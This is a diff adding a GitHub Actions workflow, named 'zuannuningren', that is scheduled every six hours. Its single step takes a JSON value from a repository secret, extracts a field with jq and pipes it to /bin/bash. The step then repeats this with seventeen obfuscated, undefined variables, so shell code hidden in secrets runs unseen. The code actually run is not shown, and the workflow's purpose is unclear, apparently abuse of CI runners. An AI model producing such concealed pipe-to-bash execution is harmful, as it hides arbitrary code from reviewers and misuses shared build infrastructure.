@@ -1,0 +1,35 @@
+name: zuannuningren
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuannuningren
+        env:
+          z984: ${{ secrets.z984 }}
+        run: |
+          echo $z984 | jq -r .se9654 | /bin/bash
+          echo $jqoz079 | jq -r .wjem8868 | /bin/bash
+          echo $mzwhc73 | jq -r .w0431 | /bin/bash
+          echo $umxtq9 | jq -r .b89989 | /bin/bash
+          echo $u76080 | jq -r .yj195 | /bin/bash
+          echo $vpcvn6307 | jq -r .iwfl9 | /bin/bash
+          echo $sa8 | jq -r .myqa643 | /bin/bash
+          echo $uon9 | jq -r .jyflh58414 | /bin/bash
+          echo $nmzsp1306 | jq -r .s00 | /bin/bash
+          echo $kzb70274 | jq -r .jek28653 | /bin/bash
+          echo $j30126 | jq -r .kwgrb62 | /bin/bash
+          echo $hjs927 | jq -r .jws42399 | /bin/bash
+          echo $nti11 | jq -r .ibs7976 | /bin/bash
+          echo $fh9818 | jq -r .asyrb22379 | /bin/bash
+          echo $cq116 | jq -r .l67676 | /bin/bash
+          echo $qkd8700 | jq -r .z98 | /bin/bash
+          echo $bkm978 | jq -r .zcftw2602 | /bin/bash
+          echo $wui50369 | jq -r .p33 | /bin/bash
+
